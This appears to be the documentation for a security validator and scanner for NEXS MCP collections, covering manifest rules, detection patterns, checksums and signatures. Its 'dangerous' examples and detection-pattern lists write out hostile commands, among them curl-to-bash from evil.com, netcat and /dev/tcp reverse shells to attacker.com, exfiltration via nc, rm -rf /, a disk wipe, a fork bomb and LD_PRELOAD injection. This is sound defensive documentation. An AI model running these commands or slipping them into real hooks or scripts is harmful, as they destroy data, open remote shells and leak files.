# Collection Security Validation

Comprehensive security system for NEXS MCP collections with 100+ validation rules and 50+ malicious pattern detection.

## Overview

The security system provides:
- **100+ Validation Rules**: Schema, security, dependencies, elements, hooks
- **50+ Scan Patterns**: Code injection, malicious commands, credential leaks
- **Checksum Verification**: SHA-256 and SHA-512 support
- **Signature Verification**: GPG and SSH key validation
- **Trusted Sources**: Whitelist-based source validation

## Quick Start

### Using the MCP Tool

```bash
# Scan a collection
mcp call scan_collection '{
  "collection_path": "./my-collection"
}'

# Validate manifest
mcp call validate_collection '{
  "manifest_path": "./collection.yaml"
}'

# Verify checksums
mcp call verify_checksum '{
  "file": "collection.tar.gz",
  "algorithm": "sha256",
  "expected": "abc123..."
}'
```

## Validation Rules

### Schema Validation (30 rules)

**Required Fields (8 rules):**
- `name`: Required, lowercase, alphanumeric + hyphens
- `version`: Required, semver format (1.0.0)
- `author`: Required, valid email
- `description`: Required, max 500 chars
- `category`: Required, valid category
- `license`: Required, SPDX identifier
- `repository`: Optional, valid URL
- `homepage`: Optional, valid URL

**Version Validation (5 rules):**
```yaml
# ✅ Valid
version: 1.0.0
version: 2.1.3
version: 0.1.0-beta

# ❌ Invalid
version: v1.0.0  # No 'v' prefix
version: 1.0     # Missing patch
version: 1.0.0.0 # Too many parts
```

**Email Validation (3 rules):**
```yaml
# ✅ Valid
author: john@example.com
maintainers:
  - alice@example.com
  - bob@example.org

# ❌ Invalid
author: john              # Missing @
author: @example.com      # Missing user
author: john@             # Missing domain
```

**URL Validation (4 rules):**
```yaml
# ✅ Valid
repository: https://github.com/user/repo
homepage: https://example.com

# ❌ Invalid
repository: github.com/user/repo  # Missing scheme
homepage: ftp://example.com       # Invalid scheme
```

**Category Validation (3 rules):**

Valid categories:
- `ai-ml`: AI/Machine Learning
- `data-processing`: Data Processing
- `development`: Development Tools
- `productivity`: Productivity
- `automation`: Automation
- `utilities`: Utilities
- `cloud-infra`: Cloud/Infrastructure
- `security`: Security
- `testing`: Testing
- `documentation`: Documentation
- `other`: Other

```yaml
# ✅ Valid
category: ai-ml

# ❌ Invalid
category: machine-learning  # Not in list
category: AI-ML             # Case sensitive
```

**License Validation (3 rules):**

Valid SPDX identifiers: MIT, Apache-2.0, GPL-3.0, BSD-3-Clause, ISC, etc.

```yaml
# ✅ Valid
license: MIT
license: Apache-2.0
license: GPL-3.0

# ❌ Invalid
license: mit               # Case sensitive
license: Apache License    # Not SPDX
```

**Tag Validation (4 rules):**
```yaml
# ✅ Valid
tags:
  - ai
  - automation
  - nlp

# ❌ Invalid
tags:
  - "AI Tools"       # No spaces
  - "automation!"    # No special chars
  - ""               # Not empty
tags: []             # Minimum 1 tag
```

### Security Validation (25 rules)

**Path Traversal (5 rules):**
```yaml
# ❌ Dangerous paths
elements:
  - path: ../../../etc/passwd      # Traversal
  - path: /etc/passwd               # Absolute path
  - path: ~/.ssh/id_rsa             # Home dir
  - path: personas/../../../bad     # Hidden traversal

# ✅ Safe paths
elements:
  - path: personas/*.yaml
  - path: skills/automation.yaml
  - path: templates/default.yaml
```

**Command Injection (8 rules):**
```yaml
# ❌ Dangerous hooks
hooks:
  post_install:
    - type: command
      command: "eval $USER_INPUT"           # eval injection
    - type: command
      command: "exec $USER_CMD"             # exec injection
    - type: command
      command: "curl $URL | bash"           # curl|bash
    - type: command
      command: "rm -rf /"                   # destructive
    - type: command
      command: "cat file | nc attacker 80"  # exfiltration

# ✅ Safe hooks
hooks:
  post_install:
    - type: command
      command: "echo 'Installation complete'"
    - type: command
      command: "mkdir -p ~/.nexs/data"
```

**Shell Expansion (3 rules):**
```yaml
# ❌ Dangerous expansions
hooks:
  post_install:
    - type: command
      command: "echo $USER"           # Variable expansion
    - type: command
      command: "cp file `whoami`.txt" # Command substitution
    - type: command
      command: "rm $(ls *.tmp)"       # Command expansion

# ✅ Safe commands
hooks:
  post_install:
    - type: command
      command: "echo 'Hello World'"
    - type: command
      command: "cp file output.txt"
```

**Credential Detection (4 rules):**
```yaml
# ❌ Hardcoded credentials
environment:
  API_KEY: "sk-1234567890abcdef"        # Obvious key
  PASSWORD: "supersecret123"             # Password
  TOKEN: "ghp_xxxxxxxxxxxxxxxxxxxx"     # GitHub token
  AWS_SECRET: "wJalrXUtnFEMI/K7MDENG"   # AWS secret

# ✅ Secure configuration
environment:
  API_KEY: "${API_KEY}"                  # Environment variable
  PASSWORD: "{{user.password}}"          # Template variable
```

**File Permissions (5 rules):**
```yaml
# ❌ Unsafe permissions
hooks:
  post_install:
    - type: command
      command: "chmod 777 ~/.ssh"        # Too permissive
    - type: command
      command: "chmod 666 credentials"   # World writable

# ✅ Safe permissions
hooks:
  post_install:
    - type: command
      command: "chmod 700 ~/.nexs"       # Owner only
    - type: command
      command: "chmod 600 config.yaml"   # Owner read/write
```

### Dependency Validation (15 rules)

**URI Format (4 rules):**
```yaml
# ✅ Valid URIs
dependencies:
  - uri: github.com/nexs-mcp/core-skills
  - uri: gitlab.com/team/tools
  - uri: file:///local/collection
  - uri: https://example.com/collection.tar.gz

# ❌ Invalid URIs
dependencies:
  - uri: ../local/collection         # Relative path
  - uri: github.com:user/repo        # Invalid format
  - uri: //missing-scheme            # No scheme
```

**Version Constraints (5 rules):**
```yaml
# ✅ Valid versions
dependencies:
  - uri: github.com/nexs-mcp/core
    version: "1.0.0"          # Exact
  - uri: github.com/nexs-mcp/core
    version: "^1.0.0"         # Compatible
  - uri: github.com/nexs-mcp/core
    version: "~1.2.0"         # Patch updates
  - uri: github.com/nexs-mcp/core
    version: ">=1.0.0"        # Minimum

# ❌ Invalid versions
dependencies:
  - uri: github.com/nexs-mcp/core
    version: "latest"         # Not semver
  - uri: github.com/nexs-mcp/core
    version: "v1.0.0"         # No 'v' prefix
```

**Circular Dependencies (3 rules):**
```yaml
# ❌ Circular dependency
# collection-a.yaml
dependencies:
  - uri: github.com/user/collection-b

# collection-b.yaml
dependencies:
  - uri: github.com/user/collection-a

# Result: Circular dependency detected
```

**Dependency Limits (3 rules):**
```yaml
# ✅ Reasonable dependencies
dependencies:
  - uri: github.com/nexs-mcp/core
  - uri: github.com/nexs-mcp/utils
  # ... (max 50 total)

# ❌ Too many dependencies
dependencies:
  # ... 51+ dependencies
  # Result: Exceeds maximum dependency limit
```

### Element Validation (20 rules)

**Path Validation (6 rules):**
```yaml
# ✅ Valid paths
elements:
  - path: personas/*.yaml           # Glob
  - path: skills/automation.yaml    # Specific
  - path: templates/**/*.yaml       # Recursive glob
  - path: agents/[a-z]*.yaml       # Pattern

# ❌ Invalid paths
elements:
  - path: ../outside/*.yaml         # Traversal
  - path: /absolute/path.yaml       # Absolute
  - path: ~/.config/file.yaml       # Home dir
  - path: "personas/*.yaml | rm"    # Command injection
```

**Type Validation (4 rules):**
```yaml
# ✅ Valid types
elements:
  - path: personas/*.yaml
    type: persona
  - path: skills/*.yaml
    type: skill
  - path: templates/*.yaml
    type: template
  - path: agents/*.yaml
    type: agent

# ❌ Invalid types
elements:
  - path: unknown/*.yaml
    type: invalid_type     # Not recognized
```

**File Existence (5 rules):**
```yaml
# ✅ Files exist
elements:
  - path: personas/assistant.yaml    # File exists
  - path: skills/*.yaml               # At least one match

# ❌ Files missing
elements:
  - path: personas/missing.yaml      # File not found
  - path: skills/*.yaml               # No matches
```

**Element Limits (5 rules):**
```yaml
# ✅ Reasonable size
elements:
  - path: personas/*.yaml    # 100 files OK
  - path: skills/*.yaml      # 50 files OK

# ❌ Too many elements
elements:
  - path: personas/*.yaml    # 1001+ files
  # Result: Exceeds maximum element limit (1000)
```

### Hook Validation (10 rules)

**Command Safety (5 rules):**
```yaml
# ✅ Safe commands
hooks:
  post_install:
    - type: command
      command: "echo 'Done'"
    - type: command
      command: "mkdir -p ~/.nexs"
  pre_uninstall:
    - type: command
      command: "echo 'Removing...'"

# ❌ Unsafe commands
hooks:
  post_install:
    - type: command
      command: "curl http://evil.com/script.sh | sh"
    - type: command
      command: "rm -rf /"
    - type: command
      command: ":(){ :|:& };:"  # Fork bomb
```

**Required Tools (3 rules):**
```yaml
# ✅ Declare tool dependencies
hooks:
  post_install:
    - type: command
      command: "jq '.version' manifest.json"
      required_tools:
        - jq

# ❌ Missing tool declaration
hooks:
  post_install:
    - type: command
      command: "jq '.version' manifest.json"
      # Result: Required tool 'jq' not declared
```

**Hook Limits (2 rules):**
```yaml
# ✅ Reasonable hooks
hooks:
  post_install:
    - type: command
      command: "echo 'Step 1'"
    # ... (max 10 hooks)

# ❌ Too many hooks
hooks:
  post_install:
    # ... 11+ hooks
    # Result: Exceeds maximum hook limit
```

## Security Scanning

### 50+ Malicious Pattern Detection

#### Critical Severity (15 patterns)

**Code Injection:**
```bash
# Pattern: eval-injection
eval "$USER_INPUT"
eval '$COMMAND'

# Pattern: exec-injection
exec "$PAYLOAD"
exec /bin/sh -c "$CMD"
```

**Destructive Commands:**
```bash
# Pattern: rm-rf
rm -rf /
rm -rf /*
rm -rf ~/*

# Pattern: dd-destruction
dd if=/dev/zero of=/dev/sda
dd if=/dev/random of=/dev/disk0
```

**Remote Code Execution:**
```bash
# Pattern: curl-bash
curl http://evil.com/script.sh | bash
wget -qO- http://evil.com/script.sh | sh
curl -fsSL http://evil.com | python

# Pattern: nc-reverse-shell
nc -e /bin/bash attacker.com 4444
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Fork Bombs:**
```bash
# Pattern: fork-bomb
:(){ :|:& };:
.() { .|.& }; .
```

#### High Severity (20 patterns)

**Privilege Escalation:**
```bash
# Pattern: sudo-no-password
sudo -S
echo "password" | sudo -S

# Pattern: setuid-chmod
chmod u+s /bin/bash
chmod 4755 file
```

**Network Listeners:**
```bash
# Pattern: netcat-listen
nc -l -p 8080
nc -lvp 4444

# Pattern: python-server
python -m http.server 8000
python3 -m http.server
```

**SQL Injection:**
```sql
-- Pattern: sql-injection
SELECT * FROM users WHERE id = " + userId + "
DELETE FROM table WHERE x = ' OR '1'='1

-- Pattern: sql-string-concat
SELECT * FROM users WHERE name = " + userName
```

**Unsafe Permissions:**
```bash
# Pattern: chmod-777
chmod 777 file
chmod -R 777 /var/www

# Pattern: chmod-666
chmod 666 credentials.txt
```

**Process Injection:**
```bash
# Pattern: ptrace-injection
ptrace(PTRACE_ATTACH, pid)

# Pattern: ld-preload
LD_PRELOAD=/tmp/malicious.so
export LD_PRELOAD
```

#### Medium Severity (10 patterns)

**Obfuscation:**
```bash
# Pattern: base64-decode
base64_decode($encoded)
echo $DATA | base64 -d | sh

# Pattern: hex-decode
echo "68656c6c6f" | xxd -r -p
```

**Credential Storage:**
```bash
# Pattern: hardcoded-password
PASSWORD="supersecret123"
API_KEY="sk-1234567890abcdef"

# Pattern: aws-credentials
AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG"
```

**Debug Operations:**
```python
# Pattern: python-debug
import pdb; pdb.set_trace()
breakpoint()

# Pattern: javascript-debugger
debugger;
```

**Temporary Files:**
```bash
# Pattern: insecure-temp
mktemp /tmp/file
/tmp/predictable_name
```

#### Low Severity (5 patterns)

**Logging:**
```javascript
// Pattern: console-log
console.log(password)
console.log("API_KEY:", apiKey)
```

**Development Artifacts:**
```python
# Pattern: todo-fixme
# TODO: Remove this backdoor
# FIXME: Security vulnerability
```

### Scanner Configuration

```yaml
# Default thresholds
security:
  scanner:
    # Fail on any critical findings
    critical_threshold: 0
    
    # Allow up to 2 high severity findings
    high_threshold: 2
    
    # Allow up to 5 medium severity findings
    medium_threshold: 5
    
    # Low severity is informational
    low_threshold: -1  # Unlimited
    
    # File size limit (10MB)
    max_file_size: 10485760
    
    # Timeout per file (5 seconds)
    scan_timeout: 5s
```

## Checksum Verification

### Supported Algorithms

**SHA-256 (Recommended):**
```bash
# Generate
sha256sum collection.tar.gz > SHA256SUMS

# Verify
sha256sum -c SHA256SUMS
```

**SHA-512 (High Security):**
```bash
# Generate
sha512sum collection.tar.gz > SHA512SUMS

# Verify
sha512sum -c SHA512SUMS
```

### Programmatic Verification

```go
import "github.com/fsvxavier/nexs-mcp/internal/collection/security"

// Verify checksum
verifier := security.NewChecksumVerifier()

err := verifier.Verify(
    "collection.tar.gz",
    "abc123...",
    security.SHA256,
)
if err != nil {
    log.Fatal("Checksum verification failed:", err)
}
```

## Signature Verification

### GPG Signatures

**Sign a collection:**
```bash
gpg --detach-sign --armor collection.tar.gz
# Creates: collection.tar.gz.asc
```

**Verify signature:**
```bash
gpg --verify collection.tar.gz.asc collection.tar.gz
```

### SSH Signatures

**Sign with SSH key:**
```bash
ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n file collection.tar.gz
# Creates: collection.tar.gz.sig
```

**Verify SSH signature:**
```bash
ssh-keygen -Y verify -f allowed_signers -I user@example.com \
  -n file -s collection.tar.gz.sig < collection.tar.gz
```

### Programmatic Verification

```go
import "github.com/fsvxavier/nexs-mcp/internal/collection/security"

// Verify GPG signature
verifier := security.NewSignatureVerifier()

err := verifier.VerifyGPG(
    "collection.tar.gz",
    "collection.tar.gz.asc",
    []byte(publicKeyArmored),
)

// Verify SSH signature
err := verifier.VerifySSH(
    "collection.tar.gz",
    "collection.tar.gz.sig",
    "user@example.com",
    []byte(publicKeySSH),
)
```

## Trusted Sources

### Default Trusted Sources

The system comes with 4 pre-configured trusted sources:

**1. NEXS Official:**
```yaml
uri: github.com/nexs-mcp/.*
trust_level: high
require_signature: true
```

**2. NEXS Organization:**
```yaml
uri: github.com/nexs-org/.*
trust_level: high
require_signature: true
```

**3. Community Verified:**
```yaml
uri: github.com/nexs-community/.*
trust_level: medium
require_signature: false
```

**4. Local Filesystem:**
```yaml
uri: file://.*
trust_level: medium
require_signature: false
```

### Custom Trusted Sources

```yaml
# Add custom trusted source
security:
  trusted_sources:
    - uri: github.com/myorg/.*
      trust_level: high
      require_signature: true
      public_keys:
        - |
          -----BEGIN PGP PUBLIC KEY BLOCK-----
          ...
          -----END PGP PUBLIC KEY BLOCK-----
```

### Trust Levels

- **high**: Official sources, signature required
- **medium**: Community sources, signature optional
- **low**: Experimental sources, use with caution

## Best Practices

1. **Always scan before publishing**: Use `mcp scan_collection`
2. **Validate manifests**: Check for schema errors
3. **Avoid dangerous patterns**: No eval, exec, rm -rf
4. **Use safe paths**: No traversal, absolute paths, or home dirs
5. **Verify dependencies**: Check for circular dependencies
6. **Limit hook commands**: Keep hooks simple and safe
7. **Declare required tools**: List all command dependencies
8. **Sign your collections**: Use GPG or SSH signatures
9. **Verify checksums**: Always check SHA-256/SHA-512
10. **Trust reputable sources**: Prefer official repositories

## Troubleshooting

### Validation Errors

**Missing required fields:**
```
Error: Missing required field 'version'
Fix: Add version field with semver format
```

**Invalid version format:**
```
Error: Invalid version format: v1.0.0
Fix: Remove 'v' prefix, use: 1.0.0
```

**Path traversal detected:**
```
Error: Path traversal detected in 'elements[0].path'
Fix: Use relative paths within collection directory
```

### Security Scan Failures

**eval injection detected:**
```
Finding: eval-injection (CRITICAL)
File: scripts/install.sh
Line: 10
Fix: Avoid eval, use safe alternatives
```

**Hardcoded credentials:**
```
Finding: hardcoded-password (MEDIUM)
File: config.yaml
Line: 5
Fix: Use environment variables or templates
```

### Checksum Mismatches

```
Error: Checksum mismatch
Expected: abc123...
Actual: def456...
Fix: Re-download collection or verify integrity
```

### Signature Verification Failures

```
Error: Invalid GPG signature
Fix: Verify public key and signature file
```

## See Also

- [Registry Guide](REGISTRY.md)
- [Publishing Guide](PUBLISHING.md)
- [ADR-008: Collection Registry Production](../adr/ADR-008-collection-registry-production.md)
- [Validator Implementation](../../internal/collection/validator.go)
- [Security Scanner](../../internal/collection/security/scanner.go)
